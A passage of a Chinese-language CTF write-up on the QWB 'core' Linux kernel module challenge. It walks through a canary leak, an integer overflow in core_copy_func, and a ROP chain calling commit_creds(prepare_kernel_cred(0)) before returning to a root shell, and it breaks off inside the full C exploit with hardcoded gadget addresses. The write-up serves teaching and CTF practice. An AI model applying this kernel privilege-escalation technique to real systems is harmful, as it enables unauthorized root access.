class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;<span class="comment">// address of to key function</span></span><br><span class="line"><span class="comment">// This function is used to get the addresses of two key functions from /tmp/kallsyms</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_function_address</span><span class="params">()</span>&#123;</span><br><span class="line">FILE* sym_table = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);<span class="comment">// including all address of kernel functions</span></span><br><span class="line"><span class="keyword">if</span>(sym_table == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: Cannot open file \&quot;/tmp/kallsyms\&quot;\n\033[0m&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> addr = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> type[<span class="number">0x10</span>];</span><br><span class="line"><span class="type">char</span> func_name[<span class="number">0x100</span>];</span><br><span class="line"><span class="comment">// when the reading raises error, the function fscanf will return a zero, so that we know the file comes to its end.</span></span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">fscanf</span>(sym_table, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, func_name))&#123;</span><br><span class="line"><span class="keyword">if</span>(commit_creds &amp;&amp; prepare_kernel_cred)<span class="comment">// two addresses of key functions are all found, return directly.</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(func_name, <span class="string">&quot;commit_creds&quot;</span>))&#123;<span class="comment">// function &quot;commit_creds&quot; found</span></span><br><span class="line">commit_creds = addr;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Note: Address of function \&quot;commit_creds\&quot; found: \033[0m%#llx\n&quot;</span>, commit_creds);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(func_name, <span class="string">&quot;prepare_kernel_cred&quot;</span>))&#123;<span class="comment">// function &quot;prepare_kernel_cred&quot; found</span></span><br><span class="line">prepare_kernel_cred = addr;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Note: Address of function \&quot;prepare_kernel_cred\&quot; found: \033[0m%#llx\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好，现在我们成功获取了这两个函数的地址，那么是不是直接将其作为函数指针调用就行了呢？当然不是，这可是内核的函数，不是用户态程序随随便便就能够调用的。不过好在我们有自定义的LKM可以作为跳板使用。</p><p>所有的内核函数都需要通过类似于接口的东西来调用，用户态无法直接调用。使用open函数打开内核进程后通过ioctl函数可以与内核进行通信，内核通过用户的ioctl函数获取用户提供的数据并进行处理，整体上看是一个黑盒。在core.ko中，我们通过IDA反编译可知，在内核装载时就创建了一个名为core的进程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  core_proc = proc_create(<span class="string">&quot;core&quot;</span>, <span class="number">438LL</span>, <span class="number">0LL</span>, &amp;core_fops);</span><br><span class="line">  printk(<span class="string">&quot;\x016core: created /proc/core entry\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在&#x2F;proc文件夹中能够找到core这个文件，也就是由core.ko创建的内核进程。使用open函数获取到文件指针，将文件指针作为ioctl函数的参数之一即可指定与core进程进行交互。在core.ko中有core_ioctl函数记录了core这个进程提供的3个接口：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889B</span>:</span><br><span class="line">      core_read(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889C</span>:</span><br><span class="line">      printk(<span class="string">&quot;\x016core: %d\n&quot;</span>, a3);</span><br><span class="line">      off = a3;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889A</span>:</span><br><span class="line">      printk(<span class="string">&quot;\x016core: called core_copy\n&quot;</span>);</span><br><span class="line">      core_copy_func(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的第二个参数是请求码，对不同的接口赋予一个编号，在传入数据时顺带传入以确认接入的接口是哪一个。这里看到有3个接口，分别实现不同的功能。我们要执行内核的函数，就必须在内核中下文章，思考如何在内核执行其原有功能时进行我们想要的操作：提权。</p><p>在内核ko文件中，我们需要重点关注data节中的file_operations结构体（定义如下）。其中是一系列指针，每一个都对应调用的函数。假如我们自己写一个内核ko模块，想要让它能够作为fd参数传入到read函数中，那么其中的file_operations的read就应该写上我们自己定义在该内核模块中的函数，用户层调用read函数也就相当于该内核模块中调用read函数指针指向的函数。如果这样的函数不存在，则此处填NULL。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line"><span class="type">loff_t</span> (*llseek) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">int</span>);</span><br><span class="line"><span class="type">ssize_t</span> (*read) (<span class="keyword">struct</span> file *, <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line"><span class="type">ssize_t</span> (*write) (<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line"><span class="type">ssize_t</span> (*read_iter) (<span class="keyword">struct</span> kiocb *, <span class="keyword">struct</span> iov_iter *);</span><br><span class="line"><span class="type">ssize_t</span> (*write_iter) (<span class="keyword">struct</span> kiocb *, <span class="keyword">struct</span> iov_iter *);</span><br><span class="line"><span class="type">int</span> (*iopoll)(<span class="keyword">struct</span> kiocb *kiocb, <span class="keyword">struct</span> io_comp_batch *,</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags);</span><br><span class="line"><span class="type">int</span> (*iterate) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> dir_context *);</span><br><span class="line"><span class="type">int</span> (*iterate_shared) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> dir_context *);</span><br><span class="line"><span class="type">__poll_t</span> (*poll) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> poll_table_struct *);</span><br><span class="line"><span class="type">long</span> (*unlocked_ioctl) (<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line"><span class="type">long</span> (*compat_ioctl) (<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line"><span class="type">int</span> (*mmap) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> vm_area_struct *);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> mmap_supported_flags;</span><br><span class="line"><span class="type">int</span> (*open) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line"><span class="type">int</span> (*flush) (<span class="keyword">struct</span> file *, <span class="type">fl_owner_t</span> id);</span><br><span class="line"><span class="type">int</span> (*release) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line"><span class="type">int</span> (*fsync) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">loff_t</span>, <span class="type">int</span> datasync);</span><br><span class="line"><span class="type">int</span> (*fasync) (<span class="type">int</span>, <span class="keyword">struct</span> file *, <span class="type">int</span>);</span><br><span class="line"><span class="type">int</span> (*lock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line"><span class="type">ssize_t</span> (*sendpage) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> page *, <span class="type">int</span>, <span class="type">size_t</span>, <span class="type">loff_t</span> *, <span class="type">int</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">long</span> <span class="params">(*get_unmapped_area)</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>)</span>;</span><br><span class="line"><span class="type">int</span> (*check_flags)(<span class="type">int</span>);</span><br><span class="line"><span class="type">int</span> (*flock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line"><span class="type">ssize_t</span> (*splice_write)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line"><span class="type">ssize_t</span> (*splice_read)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="keyword">struct</span> pipe_inode_info *, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line"><span class="type">int</span> (*setlease)(<span class="keyword">struct</span> file *, <span class="type">long</span>, <span class="keyword">struct</span> file_lock **, <span class="type">void</span> **);</span><br><span class="line"><span class="type">long</span> (*fallocate)(<span class="keyword">struct</span> file *file, <span class="type">int</span> mode, <span class="type">loff_t</span> offset,</span><br><span class="line">  <span class="type">loff_t</span> len);</span><br><span class="line"><span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> seq_file *m, <span class="keyword">struct</span> file *f);</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_MMU</span></span><br><span class="line"><span class="type">unsigned</span> (*mmap_capabilities)(<span class="keyword">struct</span> file *);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">ssize_t</span> (*copy_file_range)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="keyword">struct</span> file *,</span><br><span class="line"><span class="type">loff_t</span>, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line"><span class="type">loff_t</span> (*remap_file_range)(<span class="keyword">struct</span> file *file_in, <span class="type">loff_t</span> pos_in,</span><br><span class="line">   <span class="keyword">struct</span> file *file_out, <span class="type">loff_t</span> pos_out,</span><br><span class="line">   <span class="type">loff_t</span> len, <span class="type">unsigned</span> <span class="type">int</span> remap_flags);</span><br><span class="line"><span class="type">int</span> (*fadvise)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">loff_t</span>, <span class="type">int</span>);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>下面就是core.ko中的file_operations结构体，看到这里定义了write函数，而read函数在ioctl中传入指定的请求码后调用。因此我们可以直接使用write函数调用core模块中的core_write函数。<br><img src="https://img-blog.csdnimg.cn/84bf192ab9f8481aba5f0cf86dca16ff.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>在core_write中，我们可以将用户数据拷贝到内核中，存放在core模块中的name部分：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 __fastcall <span class="title function_">core_write</span><span class="params">(__int64 a1, __int64 a2, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  printk(<span class="string">&quot;\x016core: called core_writen&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a3 &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(name, a2, a3) )</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)a3;</span><br><span class="line">  printk(<span class="string">&quot;\x016core: error copying data from userspacen&quot;</span>, a2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFF2</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的copy_from_user函数就是拷贝函数，第一个参数为拷贝目的地址，在内核空间；第二个参数为拷贝源地址，在用户空间；第三个参数为拷贝字节数。name一共占0x800字节。</p><p>在core_read函数中，程序读取64个缓冲区的内容并将其返回给用户空间，其中开始读取的位置是我们可以改变的，这就能够泄露内核空间中该函数的canary。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">core_read</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *bufptr; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(<span class="string">&quot;\x016core: called core_read\n&quot;</span>);</span><br><span class="line">  printk(<span class="string">&quot;\x016%d %p\n&quot;</span>, off, (<span class="type">const</span> <span class="type">void</span> *)a1);</span><br><span class="line">  bufptr = buf;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16LL</span>; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)bufptr = <span class="number">0</span>;</span><br><span class="line">    bufptr += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, <span class="string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( copy_to_user(a1, &amp;buf[off], <span class="number">64LL</span>) )</span><br><span class="line">    __asm &#123; swapgs &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在core_copy_func函数中，有整形溢出，使得我们有构造ROP链的机会：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">core_copy_func</span><span class="params">(<span class="type">signed</span> __int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(<span class="string">&quot;\x016core: called core_writen&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">0x3F</span> )</span><br><span class="line">    printk(<span class="string">&quot;\x016Detect Overflow&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    qmemcpy(v1, name, (<span class="type">unsigned</span> __int16)a1);    <span class="comment">// overflow</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，基本的步骤已经明确：<br>Step 1: 使用core_read函数获取canary<br>Step 2: 使用core_write函数写入ROP到name<br>Step 3: 使用core_copy_func函数在栈上追加ROP</p><p>由于本内核模块启用了KASLR地址随机化保护机制，因此需要与计算出一个偏移量，题目中给出的vmlinux的commit_creds函数地址为FFFFFFFF8109C8E0（无地址随机化），相减即得偏移量。</p><p>为了让内核函数执行完成后能够顺利返回用户态，需要在用户态保存一些寄存器的值。这里引用开头参考资料的代码，这个函数应该首先被执行：（<a href="https://arttnba3.cn/2021/03/03/NOTE-0X03-LINUX-KERNEL-PWN-PART-II/#%E7%8A%B6%E6%80%81%E4%BF%9D%E5%AD%98">链接</a>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面只需要解决一个问题：如何构造内核空间的ROP链。</p><p>首先我们需要执行prepare_kernel_cred函数，传入rdi&#x3D;0即可，返回值保存在rax之中。因此要想将rax传入到commit_creds函数中，我们还需要先将rax的值赋值给rdi。vmlinux为我们提供了充足的gadget，很容易就能够找到这些gadget的地址，将其记录在我们的exp中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> swapgs_popfq_ret = <span class="number">0xffffffff81a012da</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> movrdirax_callrdx = <span class="number">0xffffffff8101aa6a</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> poprdx_ret = <span class="number">0xffffffff810a0f49</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> poprdi_ret = <span class="number">0xffffffff81000b2f</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> poprcx_ret = <span class="number">0xffffffff81021e53</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> iretq = <span class="number">0xFFFFFFFF81A00987</span>;</span><br></pre></td></tr></table></figure><p>这里没有找到mov rdi, rax; ret的gadget，因此使用call来代替，不过需要注意的是，call指令执行后，会将该指令下一条指令入栈。如果我们在call之后没有进行pop操作，则ret时执行的就不是我们想要的栈上的地址了。因此这里加上了一个pop rcx; ret的gadget，目的是将call指令入栈的地址pop出来以保证ret后继续执行ROP链后面的部分。</p><p>当<code>commit_creds(prepare_kernel_cred(NULL))</code>执行完毕时，我们还需要引导内核正确地退出到用户态，因此需要在后面加上swapgs和iretq指令，其中iretq指令后面需要依次跟上：返回地址、cs、rflags、sp、ss，后面的4个是我们在程序一开始就保存好的，直接接上即可，返回地址则填写执行<code>system(&quot;/bin/sh&quot;)</code>的地址。这样，从内核态返回后，我们就能够提升进程的权限了。</p><p>下面即为最终的exp，在exp中笔者加入了打印地址片段二进制值的函数<code>print_binary(char* buf, int length)</code>，便于查看指定地址的值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;<span class="comment">// address of to key function</span></span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> commit_creds_base = <span class="number">0xFFFFFFFF8109C8E0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> swapgs_popfq_ret = <span class="number">0xffffffff81a012da</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> movrdirax_callrdx = <span class="number">0xffffffff8101aa6a</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> poprdx_ret = <span class="number">0xffffffff810a0f49</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> poprdi_ret = <span class="number">0xffffffff81000b2f</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> poprcx_ret = <span class="number">0xffffffff81021e53</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> iretq = <span class="number">0xFFFFFFFF81A00987</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd = <span class="number">0</span>;<span class="comment">// file pointer of process &#x27;core&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">get_function_address</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">char</span>* buf)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">change_off</span><span class="params">(<span class="type">int</span> off)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> 